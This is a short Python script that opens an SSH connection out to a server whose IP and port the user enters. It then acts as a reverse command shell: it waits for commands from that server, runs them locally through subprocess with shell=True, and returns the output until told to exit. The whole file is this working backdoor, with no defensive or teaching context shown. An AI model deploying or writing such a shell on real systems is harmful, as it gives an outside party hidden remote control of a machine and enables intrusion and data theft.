import paramiko
import shlex
import subprocess
import getpass


def ssh_command(ip, port, user, passwd, command):
    client = paramiko.SSHClient()  # creating the SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
    client.connect(ip, port=port, username=user, password=passwd)

    # Return the underlying Transport object for this SSH connection.
    # and opening a ssh session
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        # if the client connected this will send the clientconnected! message
        ssh_session.send(command)
        print(ssh_session.recv(1024).decode())

        while True:
            command = ssh_session.recv(1024)
            try:
                cmd = command.decode()
                if cmd == 'exit':
                    client.close()
                    break
                # Run command with arguments and return its output.
                cmd_output = subprocess.check_output(
                    shlex.split(cmd), shell=True)
                ssh_session.send(cmd_output or 'OK')
            except Exception as e:
                ssh_session.send(str(e))
        client.close()
    return


if __name__ == '__main__':
    user = getpass.getuser()  # receives the username variable from the environment
    passwd = getpass.getpass()

    ip = input('Enter server IP: ')
    port = input("Enter port number: ")
    ssh_command(ip, port, user, passwd, 'ClientConnected')
